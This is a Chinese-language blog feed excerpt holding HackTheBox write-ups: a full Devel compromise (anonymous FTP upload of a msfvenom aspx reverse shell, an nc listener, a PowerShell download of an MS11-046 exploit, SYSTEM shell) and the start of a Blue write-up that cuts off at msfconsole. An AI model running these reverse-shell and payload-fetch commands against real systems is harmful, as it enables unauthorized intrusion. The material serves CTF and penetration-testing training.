    <content type="html"><![CDATA[<p>先 <code>nmap</code> 一下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV --script vuln 10.129.153.100</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 06:29 CDT</span><br><span class="line">Stats: 0:03:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.64% <span class="keyword">done</span>; ETC: 06:33 (0:00:01 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.153.100</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 7.5</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:microsoft:internet_information_services:7.5: </span><br><span class="line">|     PACKETSTORM:18058010.0https://vulners.com/packetstorm/PACKETSTORM:180580*EXPLOIT*</span><br><span class="line">|     MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-10.0https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-*EXPLOIT*</span><br><span class="line">|     CVE-2010-397210.0https://vulners.com/cve/CVE-2010-3972</span><br><span class="line">|     SSV:201229.3https://vulners.com/seebug/SSV:20122*EXPLOIT*</span><br><span class="line">|     CVE-2010-27309.3https://vulners.com/cve/CVE-2010-2730</span><br><span class="line">|     SSV:201214.3https://vulners.com/seebug/SSV:20121*EXPLOIT*</span><br><span class="line">|     PACKETSTORM:1805844.3https://vulners.com/packetstorm/PACKETSTORM:180584*EXPLOIT*</span><br><span class="line">|     MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-4.3https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-*EXPLOIT*</span><br><span class="line">|     CVE-2010-18994.3https://vulners.com/cve/CVE-2010-1899</span><br><span class="line">|     EDB-ID:158030.0https://vulners.com/exploitdb/EDB-ID:15803*EXPLOIT*</span><br><span class="line">|_    EDB-ID:151670.0https://vulners.com/exploitdb/EDB-ID:15167*EXPLOIT*</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 263.50 seconds</span></span><br></pre></td></tr></table></figure></div><p>他有開 ftp，我們可以用 <code>anonymous</code> 登入看到下面的資訊：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ftp 10.129.153.100</span><br><span class="line">Connected to 10.129.153.100.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (10.129.153.100:root): anonymous</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password: </span><br><span class="line">230 User logged <span class="keyword">in</span>.</span><br><span class="line">Remote system <span class="built_in">type</span> is Windows_NT.</span><br><span class="line">ftp&gt; <span class="built_in">dir</span></span><br><span class="line">229 Entering Extended Passive Mode (|||49157|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">03-17-17  04:37PM                  689 iisstart.htm</span><br><span class="line">03-17-17  04:37PM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure></div><p>透過瀏覽器可以看到下面的畫面：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/devel_ftp.png"                      alt="ftp"                ><br>這表示了 FTP 跟 HTTP 伺服器共享同一個根目錄，這問題很大，因為我們可以透過上傳惡意的文件，然後透過 http 來觸發，例如說 reverse shell。<br>這邊會用到 metasploit 框架中的一個工具，可以用來生 payloads。<br>透過下面的指令我們可以看到 <code>aspx</code> 是支援的格式，同時從剛剛 FTP 的資訊我們可以看到他的目錄名稱應該是 ASP.NET 生成的，包括 <code>iisstart.htm</code> 是一個標準的 IIS（Internet Information Services） 的起始頁面，可以得知上面在運行 Microsoft IIS Web 的伺服器。根據上面的資訊我們會用 aspx 來生成我們的 reverse shell。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfvenom --list formats</span><br><span class="line"></span><br><span class="line">Framework Executable Formats [--format &lt;value&gt;]</span><br><span class="line">===============================================</span><br><span class="line"></span><br><span class="line">    Name</span><br><span class="line">    ----</span><br><span class="line">    asp</span><br><span class="line">    aspx</span><br><span class="line">    aspx-exe</span><br><span class="line">    axis2</span><br><span class="line">    dll</span><br><span class="line">    ducky-script-psh</span><br><span class="line">    elf</span><br><span class="line">    elf-so</span><br><span class="line">    exe</span><br><span class="line">    exe-only</span><br><span class="line">    exe-service</span><br><span class="line">    exe-small</span><br><span class="line">    hta-psh</span><br><span class="line">    jar</span><br><span class="line">    jsp</span><br><span class="line">    loop-vbs</span><br><span class="line">    macho</span><br><span class="line">    msi</span><br><span class="line">    msi-nouac</span><br><span class="line">    osx-app</span><br><span class="line">    psh</span><br><span class="line">    psh-cmd</span><br><span class="line">    psh-net</span><br><span class="line">    psh-reflection</span><br><span class="line">    python-reflection</span><br><span class="line">    vba</span><br><span class="line">    vba-exe</span><br><span class="line">    vba-psh</span><br><span class="line">    vbs</span><br><span class="line">    war</span><br></pre></td></tr></table></figure></div><p>我們用下面的指令選一個看起來最普通的：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfvenom --list payloads | grep windows | grep reverse </span><br></pre></td></tr></table></figure></div><p>生 reverse shell：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfvenom -p windows/x64/shell/reverse_tcp -f aspx lhost=tun0 lport=4444 rhost=10.129.151.61 -o rshell.aspx</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of aspx file: 3675 bytes</span><br><span class="line">Saved as: rshell.aspx</span><br></pre></td></tr></table></figure></div><p>生好了！接著我們把他丟上去 FTP </p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ftp 10.129.151.61</span><br><span class="line">Connected to 10.129.151.61.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (10.129.151.61:root): anonymous</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password: </span><br><span class="line">230 User logged <span class="keyword">in</span>.</span><br><span class="line">Remote system <span class="built_in">type</span> is Windows_NT.</span><br><span class="line">ftp&gt; put rshell.aspx </span><br><span class="line"><span class="built_in">local</span>: rshell.aspx remote: rshell.aspx</span><br><span class="line">229 Entering Extended Passive Mode (|||49157|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">100% |*************************************************************************************************|  3722       59.15 MiB/s    --:-- ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">3722 bytes sent <span class="keyword">in</span> 00:00 (13.98 KiB/s)</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">229 Entering Extended Passive Mode (|||49158|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">03-17-17  04:37PM                  689 iisstart.htm</span><br><span class="line">10-28-24  01:39PM                 3722 rshell.aspx</span><br><span class="line">03-17-17  04:37PM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure></div><p>結果上面那個 payload 好像行不通，我換成下面這個就成功了：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.63 LPORT=4444 -o rshell.aspx</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 324 bytes</span><br><span class="line">Final size of aspx file: 2719 bytes</span><br><span class="line">Saved as: rshell.aspx</span><br></pre></td></tr></table></figure></div><p>然後瀏覽器訪問就觸發 reverse shell 了：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nc -nlvp 4444 </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.14.63] from (UNKNOWN) [10.129.151.61] 49168</span><br><span class="line">Microsoft Windows [Version 6.1.7600]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;</span><br></pre></td></tr></table></figure></div><p>結果進去之後連 user flag 的權限都還沒有，然後也發現這台伺服器是 x86 難怪剛剛的第一次的 payload 不會過：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">c:\Users&gt;<span class="built_in">cd</span> babis</span><br><span class="line"><span class="built_in">cd</span> babis</span><br><span class="line">Access is denied.</span><br><span class="line"></span><br><span class="line">c:\Users&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 137F-3971</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users</span><br><span class="line"></span><br><span class="line">18/03/2017  01:16 ��    &lt;DIR&gt;          .</span><br><span class="line">18/03/2017  01:16 ��    &lt;DIR&gt;          ..</span><br><span class="line">18/03/2017  01:16 ��    &lt;DIR&gt;          Administrator</span><br><span class="line">17/03/2017  04:17 ��    &lt;DIR&gt;          babis</span><br><span class="line">18/03/2017  01:06 ��    &lt;DIR&gt;          Classic .NET AppPool</span><br><span class="line">14/07/2009  09:20 ��    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               6 Dir(s)   4.396.625.920 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users&gt;systeminfo </span><br><span class="line">systeminfo </span><br><span class="line"></span><br><span class="line">Host Name:                 DEVEL</span><br><span class="line">OS Name:                   Microsoft Windows 7 Enterprise </span><br><span class="line">OS Version:                6.1.7600 N/A Build 7600</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Standalone Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          babis</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                55041-051-0948536-86302</span><br><span class="line">Original Install Date:     17/3/2017, 4:17:31 ��</span><br><span class="line">System Boot Time:          28/10/2024, 1:26:00 ��</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware Virtual Platform</span><br><span class="line">System Type:               X86-based PC</span><br><span class="line">Processor(s):              1 Processor(s) Installed.</span><br><span class="line">                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz</span><br><span class="line">BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume1</span><br><span class="line">System Locale:             el;Greek</span><br><span class="line">Input Locale:              en-us;English (United States)</span><br><span class="line">Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul</span><br><span class="line">Total Physical Memory:     3.071 MB</span><br><span class="line">Available Physical Memory: 2.456 MB</span><br><span class="line">Virtual Memory: Max Size:  6.141 MB</span><br><span class="line">Virtual Memory: Available: 5.535 MB</span><br><span class="line">Virtual Memory: In Use:    606 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    HTB</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 N/A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                                 Connection Name: Local Area Connection 4</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     10.129.0.1</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.129.151.61</span><br><span class="line">                                 [02]: fe80::d981:e519:55b8:816</span><br><span class="line">                                 [03]: dead:beef::8870:1e16:d944:cf4e</span><br><span class="line">                                 [04]: dead:beef::d981:e519:55b8:816</span><br></pre></td></tr></table></figure></div><p>從上面的資訊我們還可以得知作業系統的版本很舊，是 Windows 7 最早期的版本，已知存在許多漏洞。<br>我們可以透過 <code>searchsploit</code> 來找尋 Exploit Database (exploit-db) 中的漏洞資料使用方法如下，我們可以先去 google win7 x86 提權有哪些：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/devel_exploitDB.png"                      alt="db"                ><br>然後在上面可以看到左上角有一個 EDB-ID 我們可以這樣用：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ searchsploit -u <span class="comment">## update</span></span><br><span class="line">└──╼ [★]$ searchsploit -m 47176</span><br><span class="line">  Exploit: Microsoft Windows 7 build 7601 (x86) - Local Privilege Escalation</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/47176</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/windows_x86/local/47176.cpp</span><br><span class="line">    Codes: CVE-2019-1132</span><br><span class="line"> Verified: False</span><br><span class="line">File Type: C <span class="built_in">source</span>, ASCII text</span><br><span class="line">Copied to: /home/kazma/47176.cpp</span><br></pre></td></tr></table></figure></div><p>結果他沒有寫要怎麼編譯遇到很多環境問題，決定換另外一個有寫編譯方式的：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ searchsploit -m 40564</span><br><span class="line">  Exploit: Microsoft Windows (x86) - <span class="string">&#x27;afd.sys&#x27;</span> Local Privilege Escalation (MS11-046)</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/40564</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c</span><br><span class="line">    Codes: CVE-2011-1249, MS11-046</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: C <span class="built_in">source</span>, ASCII text</span><br><span class="line">Copied to: /home/kazma/40564.c</span><br><span class="line"></span><br><span class="line">┌─[eu-dedivip-1]─[10.10.14.63]─[kazma@htb-wnzfbgnuq9]─[~]</span><br><span class="line">└──╼ [★]$ i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32</span><br></pre></td></tr></table></figure></div><p>然後用 python 的 http.server 讓我們從目標機器載下 payload:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ python -m http.server </span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure></div><p>從目標機器載下來：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:\Users&gt;powershell -c <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.63:8000/40564.exe&#x27;, &#x27;c:\Users\Public\Downloads\40564.exe&#x27;)&quot;</span></span><br><span class="line">powershell -c <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.63:8000/40564.exe&#x27;, &#x27;c:\Users\Public\Downloads\40564.exe&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div><p>執行腳本：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\Public\Downloads&gt;40564.exe</span><br><span class="line">40564.exe</span><br><span class="line"></span><br><span class="line">c:\Windows\System32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure></div><p>拿下機器！</p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/devel_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先 &lt;code&gt;nmap&lt;/code&gt; 一下：&lt;/p&gt;
&lt;div class=&quot;highlight-container&quot; data-rel=&quot;Bash&quot;&gt;&lt;figure class=&quot;iseeu highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Blue Writeup</title>
    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Blue-Writeup/"/>
    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Blue-Writeup/</id>
    <published>2024-10-27T11:08:02.748Z</published>
    <updated>2024-10-27T11:23:08.579Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>先 <code>nmap</code> 一下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV --script vuln 10.129.208.2</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 06:09 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.208.2</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 991 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 89.41 seconds</span><br></pre></td></tr></table></figure></div><p>感覺跟 legacy 87% 像：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfconsole</span><br><span class="line">Metasploit tip: The use <span class="built_in">command</span> supports fuzzy searching to try and </span><br><span class="line"><span class="keyword">select</span> the intended module, e.g. use kerberos/get_ticket or use </span><br><span class="line">kerberos forge silver ticket</span><br><span class="line">                                                  </span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%  